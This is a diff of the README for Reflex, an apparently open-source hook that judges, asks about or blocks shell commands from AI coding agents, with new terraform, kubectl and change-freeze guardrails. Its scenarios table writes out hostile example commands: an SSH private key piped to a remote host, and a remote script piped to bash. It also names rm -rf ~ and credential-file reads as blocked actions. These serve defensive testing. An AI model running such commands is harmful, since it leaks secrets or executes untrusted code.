@@ -6,55 +6,48 @@
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
 </p>
 
+**Reflex makes AI coding agents prod-safe for infra teams: an open-source pre-execution hook for
+Claude Code, Codex CLI, opencode and pi that judges every shell command by where it points and what
+it will change, then lets it run, asks a human, or blocks it.**
+
 <p align="center">
   <img src="assets/demo.gif" alt="Claude Code with the Reflex plugin blocking a force push to main and a prompt injection" width="900">
 </p>
 
 <p align="center"><sub>A real Claude Code session in a scratch repository; <a href="docs/demo/README.md">how to reproduce it</a>.</sub></p>
 
-**Reflex is an open-source pre-execution risk gate and prompt injection guard for AI coding agents
-such as Claude Code, Codex CLI, opencode and pi.** It hooks into each agent (Claude Code hooks,
-Codex hooks, pi and oh-my-pi extensions, an opencode plugin, Hermes hooks) and decides for every
-shell command the agent wants to run whether it runs, needs a human's approval, or is blocked. It
-also scans what the agent reads (web pages, MCP results, files from other projects, `curl` output)
-for prompt injection before the agent acts on it.
+What it adds to the agents' built-in permission rules:
 
-Reflex starts locally with deterministic rules and no account. For commands the rules do not cover,
-it can ask [TypeSafe Jev](https://docs.typesafe.ai), a small System One model that answers typed
-questions in well under a second, and turn the answers into a decision with a policy file you can
-edit. [Laya](https://huggingface.co/convaiinnovations/laya) is an experimental local alternative to
-Jev. An autonomous profile adds a stronger model (System 2) and an asynchronous human approval
-queue, so autonomous coding agents only stop for the commands that need a person.
+- **Plan-aware terraform gate.** `terraform apply` without a saved plan asks for
+  `terraform plan -out=tfplan`. With `infra.terraform_show` on, Reflex reads the saved plan with
+  `terraform show -json` and denies any delete or replace, naming stateful resources such as
+  `aws_db_instance` first. It is off by default and needs a provider plugin cache, because
+  `terraform show` starts the provider binaries in `.terraform`, which an agent could have written.
+- **Environment awareness.** A command is judged with the AWS profile, kube context, Terraform
+  workspace, git branch and production paths such as `envs/prod`: `kubectl delete namespace` asks in
+  a dev context and is denied in a prod one.
+- **One policy across agents.** A committed `.reflex/policy.json` gives every teammate the same
+  extra rules, production markers, always-human patterns and freezes in Claude Code, Codex CLI,
+  opencode, pi and Hermes. It can only tighten; its fast lane and webhook apply only after each
+  teammate runs `reflex trust .`.
+- **Change freeze.** A window such as Friday after 15:00 in `Europe/Bucharest`, or a date range,
+  makes production commands that are not read-only ask or be denied, in shadow and enforce mode.
+- **Audit export and webhook.** `reflex audit` writes one row per decision (agent, cwd, production
+  tier, redacted command, decision, rule, who approved it) as csv, json or jsonl for SOC 2 and
+  ISO 27001 change management evidence. A Slack or json webhook gets denies, asks or production
+  decisions without delaying the hook.
+- **Fail-closed hooks.** In enforce mode a hook that crashes while loading or deciding answers ask
+  (Claude Code) or deny (Codex) instead of letting the command run unchecked.
 
-### In one minute
-
-- **What it is:** a hook, installed with one command, that gates the shell tool of Claude Code,
-  Codex CLI, pi, oh-my-pi, opencode and Hermes. MIT licensed, Node.js 18+, no runtime dependencies.
-- **How it decides:** a read-only list, deterministic rules and a fast lane settle many commands
-  on the machine with no API call (about half of one engineer's week of Claude Code commands, in
-  the [replay](#replay-what-it-would-have-done-on-a-real-week) below). The rest go to the engine you chose: `local` asks a human, `jev`
-  asks TypeSafe Jev six typed questions and applies your `policy.json`, `laya` does the same on
-  127.0.0.1.
-- **What it blocks:** `rm -rf ~`, destructive operations on production, force pushes to `main`;
-  it asks before reads of SSH keys, `~/.aws/credentials` or `.env` files, and before commands
-  judged risky in context (AWS profile, kube context, Terraform workspace, git branch).
-- **Prompt injection:** tool results from the web, MCP servers, other projects and network
-  commands are scanned; in enforce mode a finding warns the agent or removes the text, and makes
-  the rest of the session stricter.
-- **No key needed to start:** new installs use the local engine in shadow mode. A TypeSafe API key
-  is optional.
-- **Safe to try:** shadow mode only logs (hard rules still block), and `reflex replay` shows what
-  it would have done with your past Claude Code, Codex, opencode and pi sessions without running
-  anything.
-- **Limits:** it gates shell commands, not file edits or MCP calls, and it does not replace a
-  sandbox or least-privilege credentials.
-
-Questions people ask about it are answered in the [Reflex FAQ](#faq) and in
-[docs/FAQ.md](docs/FAQ.md).
+It starts keyless, with local rules in shadow mode, and it also scans what the agent reads for
+prompt injection. It gates shell commands, not file edits or MCP calls, and it does not replace a
+sandbox or least-privilege credentials.
 
 - [Install](#install)
+- [In one minute](#in-one-minute)
 - [Usage: Reflex commands](#usage-reflex-commands)
-- [Features: command approval, prompt injection guard, autonomous agents](#features-command-approval-prompt-injection-guard-autonomous-agents)
+- [Features: infra guardrails, prompt injection guard, autonomous agents](#features-infra-guardrails-prompt-injection-guard-autonomous-agents)
+- [Also included](#also-included)
 - [How a command is decided](#how-a-command-is-decided)
 - [Real-world scenarios, with outputs](#real-world-scenarios-with-outputs)
 - [Measured results](#measured-results)
@@ -129,19 +122,19 @@ Node.js 18+ as `node` on the `PATH` opencode runs with. If that setup file is al
 `~/.config/opencode/plugins/`, the npm plugin registers nothing, so no command is judged twice. See
 [docs/SETUP.md: opencode plugin](docs/SETUP.md#opencode-plugin).
 
-### Every agent: install script or package runner
-
-```sh
-curl -fsSL https://raw.githubusercontent.com/ursuciprian/reflex/main/install.sh | bash
-```
-
-Or with a package runner:
+### Every agent: package runner or install script
 
 ```sh
 npx @ursuciprian/reflex setup
 pnpm dlx @ursuciprian/reflex setup
 bunx @ursuciprian/reflex setup
 yarn dlx @ursuciprian/reflex setup    # yarn 2+
+```
+
+Or with the install script:
+
+```sh
+curl -fsSL https://raw.githubusercontent.com/ursuciprian/reflex/main/install.sh | bash
 ```
 
 Requirements: Node.js 18+ on macOS or Linux (including WSL). Native Windows is not supported yet.
@@ -162,6 +155,32 @@ npx @ursuciprian/reflex setup --dry-run         # preview configuration changes
 To use Jev, create a [TypeSafe API key](https://console.typesafe.ai/keys); macOS setup can store it
 in the Keychain. See [docs/SETUP.md](docs/SETUP.md) for all options, per-agent notes and
 uninstalling.
+
+## In one minute
+
+- **What it is:** a hook, installed with one command, that gates the shell tool of Claude Code,
+  Codex CLI, pi, oh-my-pi, opencode and Hermes. MIT licensed, Node.js 18+, no runtime dependencies.
+- **How it decides:** a read-only list, deterministic rules and a fast lane settle many commands
+  on the machine with no API call (about half of one engineer's week of Claude Code commands, in
+  the [replay](#replay-what-it-would-have-done-on-a-real-week) below). The rest go to the engine you
+  chose: `local` asks a human, `jev` asks [TypeSafe Jev](https://docs.typesafe.ai) six typed
+  questions and applies your `policy.json`.
+- **What it blocks:** `rm -rf ~`, destructive operations on production, force pushes to `main`;
+  it asks before `terraform apply` without a saved plan, before reads of SSH keys,
+  `~/.aws/credentials` or `.env` files, and before commands judged risky in context.
+- **Prompt injection:** tool results from the web, MCP servers, other projects and network
+  commands are scanned; in enforce mode a finding warns the agent or removes the text, and makes
+  the rest of the session stricter.
+- **No key needed to start:** new installs use the local engine in shadow mode. A TypeSafe API key
+  is optional.
+- **Safe to try:** shadow mode only logs (hard rules still block), and `reflex replay` shows what
+  it would have done with your past Claude Code, Codex, opencode and pi sessions without running
+  anything.
+- **Limits:** it gates shell commands, not file edits or MCP calls, and it does not replace a
+  sandbox or least-privilege credentials.
+
+Questions people ask about it are answered in the [Reflex FAQ](#faq) and in
+[docs/FAQ.md](docs/FAQ.md).
 
 ## Usage: Reflex commands
 
@@ -190,16 +209,43 @@ enforce in shadow mode too; everything else is only logged. Settings and policy 
 and uninstall. `reflex run` always enforces, asks on its controlling terminal when needed, and
 refuses deterministic denies; it does not grant an agent permission.
 
-To reduce approval prompts, `reflex suggest` reads the same session transcripts as `reflex replay`
-and proposes project-scoped fast-lane entries for the build, test and lint commands your agents keep
-asking about, with the count, a masked sample, why each is safe and the asks per 100 commands before
-and after. It works next to the Claude Code permissions allowlist and Codex approvals, keeps the
-human in the loop for everything else, and never suggests deletes, pushes, deploys, installs,
-network calls, secrets or production. `--write` changes Reflex's own configuration, so when an agent
-runs it the tamper rule asks a human: an agent cannot widen its own allow list. See
-[GUIDE: suggest fewer permission prompts](docs/GUIDE.md#suggest-fewer-permission-prompts).
+## Features: infra guardrails, prompt injection guard, autonomous agents
 
-## Features: command approval, prompt injection guard, autonomous agents
+### Infra guardrails: terraform, kubectl, AWS and change management
+
+Terraform AI agent guardrails and Claude Code production safety controls, which work the same way
+in Codex CLI, opencode, pi and Hermes:
+
+- [Plan-aware terraform gate](docs/GUIDE.md#plan-aware-terraform-gate-stop-ai-agents-from-destroying-infrastructure):
+  an agent's `terraform apply` without a plan file asks for `terraform plan -out=tfplan`. With
+  `infra.terraform_show` on and a provider plugin cache, Reflex judges the apply by what the saved
+  plan will change: it reads the plan with `terraform show -json` (never `plan` or `apply`), denies a
+  plan that deletes or replaces anything and names stateful resources such as `aws_db_instance`
+  first. Off by default, because `terraform show` starts provider binaries an agent could have
+  written; with the cache, it runs only when every provider in `.terraform` is a symlink into it.
+  `terraform destroy` asks, and is denied in production.
+- kubectl AI agent guardrail (optional, `infra.kubectl_diff`): `kubectl diff` and server dry runs flag
+  deletes of namespaces, PVCs, PVs, statefulsets and CRDs before they run.
+- Production context: the working directory (`envs/prod`), AWS profile and region, kube context,
+  Terraform workspace and git branch are part of every decision, so the same `kubectl delete` or
+  `aws rds delete-db-instance` asks in dev and is denied in production.
+- [Team policy](docs/GUIDE.md#team-policy-share-reflex-rules-across-a-repo): team guardrails for AI
+  coding agents in a committed `.reflex/policy.json` (extra rules, always-human patterns, prod
+  markers, freezes, a mode floor, stricter `infra` settings), applied by every teammate's Reflex in
+  Claude Code, Codex and the other agents. It only tightens; its fast lane needs `reflex trust .`.
+- [Change freeze](docs/GUIDE.md#change-freeze-for-ai-coding-agents): a deploy freeze or change
+  window for AI coding agents (`{"days": ["fri"], "after": "15:00", "tz": "Europe/Bucharest"}` or a
+  date range). During it, a production command that is not read-only asks or is denied, in shadow
+  and enforce mode. Set in `config.json` or the team policy; it can only tighten, and
+  `reflex status` shows whether a freeze is active.
+- [Audit log](docs/GUIDE.md#audit-log-for-ai-agent-commands-soc-2): `reflex audit` exports one row
+  per decision (agent, session, cwd, production tier and why, redacted command, decision, rule, who
+  approved it) as csv, json or jsonl, for SOC 2 and ISO 27001 change management evidence. An
+  optional [webhook](docs/GUIDE.md#decision-webhook) (Slack or json, https only) posts redacted
+  denies, asks or production decisions without ever delaying the hook.
+- [Fails closed](docs/GUIDE.md#reflex-fails-closed): every hook starts through `hook.mjs`, so a
+  crash while loading or deciding still answers in the agent's own contract (Claude Code ask, Codex
+  deny) in enforce mode, and `reflex status` reports it.
 
 ### Command gate: tool call gating before execution
 
@@ -212,17 +258,10 @@ runs it the tamper rule asks a human: an agent cannot widen its own allow list. 
   never auto-approved.
 - Asks before reading SSH private keys, `~/.aws/credentials`, `.netrc`, `.pgpass`, `.env` files or
   Kubernetes secrets.
-- Asks for `terraform plan -out=tfplan` when an agent runs `terraform apply` without a plan file. With
-  `infra.terraform_show` on and a provider plugin cache, it judges the apply by what the saved plan
-  will change: it reads the plan with `terraform show -json` (never `plan` or `apply`), denies a plan
-  that deletes or replaces anything and names stateful resources such as `aws_db_instance` first. Off
-  by default, because `terraform show` starts provider binaries an agent could have written. Optional `kubectl diff` and server dry runs flag deletes of namespaces,
-  PVCs, statefulsets and CRDs ([plan-aware terraform gate](docs/GUIDE.md#plan-aware-terraform-gate-stop-ai-agents-from-destroying-infrastructure)).
 - Only adds friction by default: it emits `ask` or `deny` and leaves `pass` to the agent's own
   permission settings. Opt-in [calibrated allow](docs/GUIDE.md#calibrated-allow) lets it approve
   commands it judges clearly safe.
 - Redacts secrets before anything leaves the machine or is logged.
-- Stops runaway agents in real time: loops, a failing command run again and again, denial storms, burn rate and rising risk pause the session with a clear reason ([runaway guard](docs/GUIDE.md#runaway-guard-stop-runaway-ai-agents)).
 
 ### Prompt injection guard for coding agents
 
@@ -249,7 +288,7 @@ runs it the tamper rule asks a human: an agent cannot widen its own allow list. 
   the index.
 - Budgets, per-session caps, a verdict cache and a breaker that keep System 2 spend small.
 
-### Engines: local rules, TypeSafe Jev (System One), Laya
+### Engines: local rules and TypeSafe Jev (System One)
 
 - `local` (default for new installs): rules, the read-only list and the fast lane. No key, no
   network calls. Uncovered commands ask.
@@ -259,39 +298,38 @@ runs it the tamper rule asks a human: an agent cannot widen its own allow list. 
   (Decisions API), Jev Cloudflare Workers AI, the Vercel AI Gateway, or any compatible endpoint.
   `reflex setup --provider openrouter`; each key goes to its own provider only
   ([GUIDE: use Jev through OpenRouter, Cloudflare or Vercel](docs/GUIDE.md#use-jev-through-openrouter-cloudflare-or-vercel)).
-- `laya` (experimental): the same questions answered by a
-  [Laya](https://huggingface.co/convaiinnovations/laya) checkpoint (`typed-decisions` by default)
-  served on 127.0.0.1. Nothing leaves the machine. Measured below Jev on every golden set, so
-  not recommended for enforcement ([GUIDE: Laya, local System 1](docs/GUIDE.md#laya-local-system-1)).
+- `laya` (experimental, local): see [Also included](#also-included).
 
-### Also included (optional, most need Jev)
+## Also included
 
-- Subgoal dedup: denies a subagent spawn that repeats one already launched in the session.
-- [Conditional instructions](docs/GUIDE.md#conditional-instructions): `.reflex/instructions/*.md`
-  fragments injected only while their condition holds.
-- [Tool router](docs/GUIDE.md#tool-router): one MCP server that exposes `find_tools`,
-  `describe_tool` and `run` in front of your MCP servers, with every call gated.
+General-purpose extras that ship in the same package. Most are optional, and several need Jev.
+
+- [Runaway guard](docs/GUIDE.md#runaway-guard-stop-runaway-ai-agents): pauses a session on loops,
+  a failing command run again and again, denial storms, burn rate and rising risk.
+- [Replay](#replay-what-it-would-have-done-on-a-real-week): `reflex replay` runs your past Claude
+  Code, Codex, opencode and pi commands through the gate, executing and writing nothing.
+- [Suggest](docs/GUIDE.md#suggest-fewer-permission-prompts): `reflex suggest` proposes
+  project-scoped fast-lane entries for the build, test and lint commands your agents keep asking
+  about, and never suggests deletes, pushes, deploys, installs, network calls, secrets or production.
+- [MCP server](docs/GUIDE.md#reflex-mcp-server-ask-before-acting-claude-desktop-cursor-cowork):
+  `reflex mcp` gives Claude Desktop, Cursor, Cowork and any MCP host read-only, advisory tools
+  (`reflex_check`, `reflex_scan`, `reflex_status`, `reflex_audit`, `reflex_explain`); hooks still
+  enforce.
 - [Model routing](docs/GUIDE.md#model-routing): a LiteLLM pre-call hook that keeps restricted
   content on cleared models and sends easy work to cheaper ones.
 - [Context layer](docs/GUIDE.md#context-layer-pi-and-oh-my-pi) for pi and oh-my-pi (experimental):
   trims large tool outputs per request.
-- `reflex report`, a Prometheus Pushgateway export and a Grafana dashboard (`dashboards/reflex.json`).
-- `reflex doctor` and `reflex status` to check that hooks are installed and firing.
-- [MCP server](docs/GUIDE.md#reflex-mcp-server-ask-before-acting-claude-desktop-cursor-cowork): `reflex mcp`, an MCP server
-  for AI agent safety in Claude Desktop, Cursor, Cowork and any MCP host. Read-only, advisory tools (`reflex_check`,
-  `reflex_scan`, `reflex_status`, `reflex_audit`, `reflex_explain`) let the agent ask the gate before acting; hooks
-  still enforce, and the tools never change Reflex's configuration.
-- [Team policy](docs/GUIDE.md#team-policy-share-reflex-rules-across-a-repo): team guardrails for AI coding agents in a
-  committed `.reflex/policy.json` (extra rules, always-human patterns, prod markers, a mode floor), applied by every
-  teammate's Reflex in Claude Code, Codex and the other agents. It only tightens; its fast lane needs `reflex trust .`.
-- [Change freeze](docs/GUIDE.md#change-freeze-for-ai-coding-agents): a deploy freeze or change window for AI coding
-  agents (`{"days": ["fri"], "after": "15:00", "tz": "Europe/Bucharest"}` or a date range). During it, a production
-  command that is not read-only asks or is denied, in every mode. Change management for Claude Code and Codex in
-  `config.json` or the team policy; it can only tighten, and `reflex status` shows whether a freeze is active.
-- [Audit log](docs/GUIDE.md#audit-log-for-ai-agent-commands-soc-2): `reflex audit` exports one row per decision
-  (agent, session, cwd, production tier and why, redacted command, decision, rule, who approved it) as csv, json or
-  jsonl, for SOC 2 and ISO 27001 change management evidence. An optional webhook (Slack or json, https only) posts
-  redacted denies, asks or production decisions without ever delaying the hook.
+- [Tool router](docs/GUIDE.md#tool-router): one MCP server that exposes `find_tools`,
+  `describe_tool` and `run` in front of your MCP servers, with every call gated.
+- [Laya](docs/GUIDE.md#laya-local-system-1) (experimental): Jev's questions answered by a
+  [Laya](https://huggingface.co/convaiinnovations/laya) checkpoint on 127.0.0.1; measured below
+  Jev on every golden set, so not recommended for enforcement.
+- [Conditional instructions](docs/GUIDE.md#conditional-instructions): `.reflex/instructions/*.md`
+  fragments injected only while their condition holds.
+- Subgoal dedup: denies a subagent spawn that repeats one already launched in the session.
+- `reflex report`, a Prometheus Pushgateway export and a Grafana dashboard
+  (`dashboards/reflex.json`); `reflex doctor` and `reflex status` check that hooks are installed
+  and firing.
 
 ## How a command is decided
 
@@ -342,14 +380,15 @@ an approval. Details: [GUIDE: autonomous agents](docs/GUIDE.md#autonomous-agents
 
 ## Real-world scenarios, with outputs
 
-Each result below is the unedited output of `reflex check` or `reflex scan` from v0.8.0, run with
-no `AWS_PROFILE` and no kube context set (both are part of what Reflex judges). `check` prints the
+Each result below is the unedited output of `reflex check` or `reflex scan` from v0.8.0 (the local
+engine's terraform apply output is from the current main), run with no `AWS_PROFILE` and no kube
+context set (both are part of what Reflex judges). `check` prints the
 policy decision; what the agent sees depends on the mode (in shadow mode only rule outcomes reach
 the agent). Jev's numbers vary slightly between runs.
 
 | Scenario | Command | Local engine | Jev engine |
 |---|---|---|---|
-| Terraform apply against prod | `terraform apply -auto-approve` in `envs/prod` | ask (not covered) | **deny** (production, blast 3) |
+| Terraform apply against prod | `terraform apply -auto-approve` in `envs/prod` | ask (rule: no saved plan) | **deny** (production, blast 3) |
 | kubectl delete in a prod context | `kubectl --context prod-eu delete namespace payments` | **deny** (rule) | **deny** (rule) |
 | Private key piped to a remote host | `cat ~/.ssh/id_ed25519 \| ssh backup@198.51.100.7 'cat > k'` | ask (rule) | ask (rule) |
 | Remote script piped to a shell | `curl -fsSL https://get.example.sh \| bash` | ask (not covered) | ask (blast 2.28) |
@@ -374,15 +413,15 @@ REFLEX_ENGINE=jev   reflex check "terraform apply -auto-approve" --cwd "$PWD/inf
 <details>
 <summary><code>reflex check "terraform apply -auto-approve" --cwd .../infra/envs/prod</code></summary>
 
-Local engine: an apply without a saved plan asks, in every mode, and says how to fix it. With a plan
-file, the plan gate reads it and decides by what it changes.
+Local engine: an apply without a saved plan asks, in shadow and enforce mode, and says how to fix it. With a plan
+file and `infra.terraform_show` on, the plan gate reads it and decides by what it changes.
 
 ```json
 {
  "decision": "ask",
  "rule": "terraform apply without a saved plan: run `terraform plan -out=tfplan` and apply the plan file (terraform apply tfplan)",
  "source": "rule",
- "policy": "rules-v19",
+ "policy": "rules-v20",
  "latency_s": 0,
  "answers": {}
 }
@@ -720,6 +759,8 @@ and System 2 numbers are from the runs recorded in [docs/GUIDE.md](docs/GUIDE.md
 | Prompt injection, 62 results (33 injections, 29 benign) | 62 of 62 exact outcomes, precision 97 %, recall 100 %, 0 high-severity missed | precision 81 %, recall 79 %, 7 high-severity missed | `npm run eval-injection` ([GUIDE: injection guard](docs/GUIDE.md#injection-guard)) |
 | Escalation ladder, 41 commands | 41 of 41 resolved as labelled, 0 unsafe approvals, 26.8 human interventions and 19.5 System 2 calls per 100 commands | 0 unsafe approvals, 34.1 human interventions and 36.6 System 2 calls per 100 commands | `npm run eval-ladder` ([GUIDE: ladder metrics](docs/GUIDE.md#metrics-1)) |
 
+The tool gate set has since grown to 183 cases (applies without a readable plan, among others);
+those were not part of the live run above, so the 171-case numbers are the latest measured ones.
 A MISS is a risky command that got a softer outcome than labelled. The ladder eval uses a System 2
 stub that approves everything, so only the rules, System 1 and the always-human class stand between
 an escalated command and running.
@@ -809,6 +850,16 @@ points; a sandbox limits what any command can reach. The two work together.
 | [abide](https://github.com/coldteadotai/abide) | Enforces your `AGENTS.md` / project rules on each edit and on the turn's diff, using Jev | Checks code the agent writes against your conventions, which Reflex does not do | Complementary: abide checks edits after they happen; Reflex gates shell commands and tool results before execution. Both can run on the same agent. |
 | Generic LLM-as-judge hooks | Send each command to a general LLM for a verdict | Any model, free-form reasoning, simple to write | Rules, the read-only list and the fast lane settle about half of commands (51 % on one engineer's week of Claude Code in the replay above) with no API call; the rest cost one typed Jev request (about 1k tokens); a stronger model is asked only on escalation, with budgets, caps and a cache; a policy file makes decisions replayable and tunable. |
 
+For infra work, the difference by capability:
+
+| Capability | Built-in agent permissions (Claude Code, Codex) | Container or OS sandbox | Reflex |
+|---|---|---|---|
+| Plan-aware terraform | A prefix rule can ask on `terraform apply`; the plan is not read | Not in scope | Asks for a saved plan; with `infra.terraform_show` and a plugin cache, denies a plan that deletes or replaces |
+| Production context | Rules match the command text only | Limits what a command can reach, not which account or cluster it targets | AWS profile, kube context, Terraform workspace, git branch and prod paths in every decision |
+| Change freeze | Not built in | Not built in | Time or date windows that ask or deny production commands, from `config.json` or the team policy |
+| Audit export | Each agent's own logs and telemetry, in its own format | Not in scope | `reflex audit`: one csv, json or jsonl row per decision for SOC 2 and ISO 27001 evidence, plus a webhook |
+| Cross-agent policy | Each agent's own settings files, in that agent's format | Per container image | One committed `.reflex/policy.json` applied in Claude Code, Codex CLI, opencode, pi and Hermes |
+
 Keep IAM, network controls and least-privilege credentials, and use Reflex for the decisions a
 sandbox cannot make.
 
@@ -883,15 +934,25 @@ production and force pushes to `main`, and ask before reads of private keys and 
 in shadow mode too. After a shadow period, `reflex setup --mode enforce` also puts the engine's
 judgments in front of the agent. See the [real-world scenarios](#real-world-scenarios-with-outputs).
 
-### Can Reflex stop a Claude Code or Codex agent from running terraform destroy or a destructive terraform apply?
+### How does Reflex handle terraform apply?
 
-Yes. `terraform destroy` is a rule (ask, deny in production), and an apply without a plan file asks
-the agent to run `terraform plan -out=tfplan` and apply that file. With `infra.terraform_show` on and
-a provider plugin cache, Reflex also reads the saved plan with `terraform show -json` and denies a
-plan that deletes or replaces resources, naming stateful ones like databases and buckets first. It is
-off by default because `terraform show` starts provider binaries from `.terraform`, which an agent
-can write. The hook never runs `plan` or `apply` itself. See
+An apply without a saved plan file asks, in shadow and enforce mode, and tells the agent to run
+`terraform plan -out=tfplan` and apply that file (`infra.require_plan_in_prod` makes it a deny in
+production). With `infra.terraform_show` on, Reflex reads the saved plan with `terraform show -json`
+in the command's directory and counts creates, updates, deletes and replaces: any delete or replace
+is denied, with stateful resources such as `aws_db_instance` named first, and a clean plan still asks
+in production. It needs a provider plugin cache: `terraform show` starts the provider binaries in
+`.terraform`, so the hook runs it only when every provider there is a symlink into your cache. The
+hook never runs `plan` or `apply` itself. See
 [GUIDE: plan-aware terraform gate](docs/GUIDE.md#plan-aware-terraform-gate-stop-ai-agents-from-destroying-infrastructure).
+
+### Can Reflex prevent an AI agent's terraform destroy in Claude Code or Codex?
+
+Yes. `terraform destroy`, `apply -destroy` and `apply -replace=` hit the destroy rules: they ask, and
+are denied in production (a prod working directory, AWS profile, kube context, Terraform workspace
+or git branch, or a prod name in the command such as `-chdir=envs/prod`). A team policy's `prod`
+markers make them ask, not deny. Rule outcomes hold in shadow mode too, and in the autonomous profile no model can approve
+them. See [real-world scenarios](#real-world-scenarios-with-outputs).
 
 ### How is Reflex different from Claude Code permission prompts and allowlists?
 
